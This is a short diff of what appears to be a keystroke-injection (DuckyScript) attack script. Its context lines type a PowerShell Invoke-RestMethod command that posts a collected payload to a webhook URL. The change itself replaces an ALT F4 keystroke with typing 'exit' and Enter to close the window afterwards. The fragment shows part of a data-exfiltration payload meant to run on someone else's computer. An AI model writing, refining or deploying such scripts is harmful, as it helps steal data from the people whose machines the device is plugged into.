@@ -108,4 +108,5 @@ ENTER
 STRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
 ENTER
 DELAY 250
-ALT F4
+STRING exit
+ENTER
